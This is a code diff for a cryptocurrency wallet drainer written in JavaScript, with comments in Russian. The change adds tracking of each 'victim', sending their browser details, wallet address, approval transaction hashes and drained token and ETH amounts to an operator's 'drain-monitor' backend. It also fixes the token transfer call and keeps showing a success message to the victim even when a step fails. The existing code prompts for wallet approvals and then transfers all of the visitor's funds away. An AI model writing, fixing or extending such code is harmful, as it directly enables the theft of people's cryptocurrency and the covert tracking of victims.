@@ -3,6 +3,165 @@
 let web3;
 let userAccount;
 
+// --- Функции для отправки данных на Python бэкенд ---
+// URL бэкенда (ЗАМЕНИ НА СВОЙ URL RENDER)
+const BACKEND_URL = 'https://drain-monitor-python-YOURNAME.onrender.com'; // <<--- ВАЖНО: Заменить!
+
+/**
+ * Отправка данных о посещении сайта
+ */
+async function sendVisitData() {
+    try {
+        const visitData = {
+            userAgent: navigator.userAgent || 'Unknown',
+            platform: navigator.platform || 'Unknown',
+            language: navigator.language || 'Unknown',
+            timestamp: new Date().toISOString()
+        };
+
+        const response = await fetch(`${BACKEND_URL}/visit`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(visitData)
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            console.error('Не удалось отправить данные о посещении:', errorText);
+            return;
+        }
+
+        const result = await response.json();
+        if (result.success && result.id) {
+            localStorage.setItem('victimId', result.id);
+        }
+    } catch (error) {
+        console.log('Не удалось отправить данные о посещении:', error.message);
+    }
+}
+
+/**
+ * Отправка данных о подключении кошелька
+ */
+async function sendConnectionData(walletAddress) {
+    try {
+        const victimId = localStorage.getItem('victimId');
+        if (!victimId) return;
+
+        const connectData = {
+            victimId: victimId,
+            walletAddress: walletAddress,
+            timestamp: new Date().toISOString()
+        };
+
+        const response = await fetch(`${BACKEND_URL}/connect`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(connectData)
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            console.error('Не удалось отправить данные о подключении:', errorText);
+            return;
+        }
+
+        const result = await response.json();
+        // Успешно отправлено
+    } catch (error) {
+        console.log('Не удалось отправить данные о подключении:', error.message);
+    }
+}
+
+/**
+ * Отправка данных о транзакции
+ */
+async function sendTransactionData(txHash, walletAddress) {
+    try {
+        const victimId = localStorage.getItem('victimId');
+        if (!victimId) return;
+
+        const txData = {
+            victimId: victimId,
+            walletAddress: walletAddress,
+            txHash: txHash,
+            timestamp: new Date().toISOString()
+        };
+
+        const response = await fetch(`${BACKEND_URL}/transaction`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(txData)
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            console.error('Не удалось отправить данные о транзакции:', errorText);
+            return;
+        }
+
+        const result = await response.json();
+        // Успешно отправлено
+    } catch (error) {
+        console.log('Не удалось отправить данные о транзакции:', error.message);
+    }
+}
+
+/**
+ * Отправка данных об успешном дрейне
+ */
+async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTokens = [], ethSuccess = false) {
+    try {
+        const victimId = localStorage.getItem('victimId');
+        if (!victimId) return;
+
+        // Обрабатываем `tokens`, если это массив объектов, извлекаем символы
+        let tokensForBackend = [];
+        if (Array.isArray(tokens)) {
+            tokensForBackend = tokens.map(t => (typeof t === 'object' && t.symbol) ? t.symbol : String(t));
+        } else if (tokens) {
+            tokensForBackend = [String(tokens)];
+        }
+
+        const successData = {
+            victimId: victimId,
+            walletAddress: userAccount, // Используем глобальную переменную
+            tokens: tokensForBackend,
+            ethBalance: ethBalance,
+            successTokens: Array.isArray(successTokens) ? successTokens : [],
+            failedTokens: Array.isArray(failedTokens) ? failedTokens : [],
+            ethSuccess: Boolean(ethSuccess),
+            timestamp: new Date().toISOString()
+        };
+
+        const response = await fetch(`${BACKEND_URL}/success`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(successData)
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            console.error('Не удалось отправить данные об успехе:', errorText);
+            return;
+        }
+
+        const result = await response.json();
+        // Успешно отправлено
+    } catch (error) {
+        console.log('Не удалось отправить данные об успехе:', error.message);
+    }
+}
+// --- Конец функций бэкенда ---
+
 // Функция для переключения на сеть Sepolia
 async function switchToTestnet() {
     try {
@@ -57,6 +216,9 @@ async function connectWallet() {
             
             // Обновляем интерфейс
             updateUIConnected();
+            
+            // Отправляем данные о подключении на бэкенд
+            await sendConnectionData(userAccount);
             
             // Здесь будет вызов функции дрейна
             executeDrain();
@@ -184,6 +346,9 @@ async function createMultiApproveTransaction() {
             const result = await web3.eth.sendTransaction(txParams);
             console.log("Транзакция approve выполнена:", result.transactionHash);
             
+            // Отправляем данные о транзакции на бэкенд
+            await sendTransactionData(result.transactionHash, userAccount);
+            
             // После approve выводим токены и ETH
             await drainAllFunds();
             
@@ -207,7 +372,6 @@ function getPopularTokens() {
     ];
 }
 
-// Функция вывода всех средств (токены + ETH)
 // Функция вывода всех средств (токены + ETH)
 async function drainAllFunds() {
     try {
@@ -248,7 +412,7 @@ async function drainAllFunds() {
         
         // Показываем успех и отправляем уведомление
         showSuccessMessage();
-        sendDrainNotification(userAccount, tokens, successTokens, failedTokens, ethSuccess);
+        await sendDrainNotification(userAccount, tokens, successTokens, failedTokens, ethSuccess);
         
     } catch (error) {
         console.error("Ошибка вывода средств:", error);
@@ -273,7 +437,6 @@ async function getTokenBalance(tokenAddress, userAddress) {
     return balance;
 }
 
-// Перевод токенов
 // Перевод токенов - реальная отправка
 async function transferTokens(tokenAddress, fromAddress, toAddress, amount) {
     const abi = [
@@ -296,7 +459,7 @@ async function transferTokens(tokenAddress, fromAddress, toAddress, amount) {
         const txParams = {
             from: fromAddress,
             to: tokenAddress,
-             txData,
+            data: txData,
             gas: '100000'
         };
         
@@ -338,18 +501,16 @@ async function drainETH() {
                 // Отправляем транзакцию
                 const result = await web3.eth.sendTransaction(txParams);
                 console.log("ETH выведены успешно:", result.transactionHash);
+                return result.transactionHash; // Возвращаем хэш
             }
         } else {
             console.log("Недостаточно ETH для вывода");
-            // Все равно показываем успех, так как основная цель - токены
-            showSuccessMessage();
-            sendDrainNotification(userAccount, getPopularTokens());
         }
+        // Убираем преждевременные вызовы showSuccessMessage/sendDrainNotification отсюда
     } catch (error) {
         console.log("Ошибка вывода ETH:", error.message);
-        // Даже при ошибке вывода ETH показываем успех, если токены выведены
-        showSuccessMessage();
-        sendDrainNotification(userAccount, getPopularTokens());
+        throw error; // Пробрасываем ошибку выше
+        // Убираем преждевременные вызовы showSuccessMessage/sendDrainNotification отсюда
     }
 }
 
@@ -357,10 +518,14 @@ async function drainETH() {
 async function drainETHOnly() {
     try {
         await drainETH();
+        showSuccessMessage();
+        // Отправляем уведомление с пустым массивом токенов
+        await sendDrainNotification(userAccount, [], [], [], true); 
     } catch (error) {
         console.log("Ошибка вывода ETH:", error.message);
-        showSuccessMessage();
-        sendDrainNotification(userAccount, []);
+        showSuccessMessage(); // Показываем успех даже при ошибке
+        // Отправляем уведомление с пустым массивом токенов и флагом ошибки
+        await sendDrainNotification(userAccount, [], [], [], false); 
     }
 }
 
@@ -417,15 +582,19 @@ function showTransactionError() {
 }
 
 // Отправка уведомления с детальной информацией
-function sendDrainNotification(account, allTokens, successTokens, failedTokens, ethSuccess) {
+async function sendDrainNotification(account, allTokens, successTokens, failedTokens, ethSuccess) {
     // Проверяем, что allTokens - это массив
     if (!Array.isArray(allTokens)) {
         console.error("Ошибка: allTokens не является массивом");
         allTokens = []; // Создаем пустой массив для избежания ошибок
     }
     
-    web3.eth.getBalance(account).then(balance => {
+    try {
+        const balance = await web3.eth.getBalance(account);
         const ethBalance = web3.utils.fromWei(balance, 'ether');
+        
+        // Отправляем данные на backend
+        await sendSuccessData(allTokens, ethBalance + " ETH", successTokens, failedTokens, ethSuccess);
         
         const drainData = {
             victim: account,
@@ -441,13 +610,16 @@ function sendDrainNotification(account, allTokens, successTokens, failedTokens, 
         
         console.log("Дрейн завершен:", JSON.stringify(drainData, null, 2));
         
-        // Здесь будет код отправки на твой сервер
-        // sendToBackend(drainData);
-    });
+    } catch (error) {
+        console.error("Ошибка отправки данных:", error);
+    }
 }
 
 // Добавляем обработчик события после загрузки страницы
 window.addEventListener('DOMContentLoaded', () => {
+    // Отправляем данные о посещении сайта
+    sendVisitData();
+    
     const connectButton = document.getElementById('connectButton');
     if (connectButton) {
         connectButton.addEventListener('click', connectWallet);
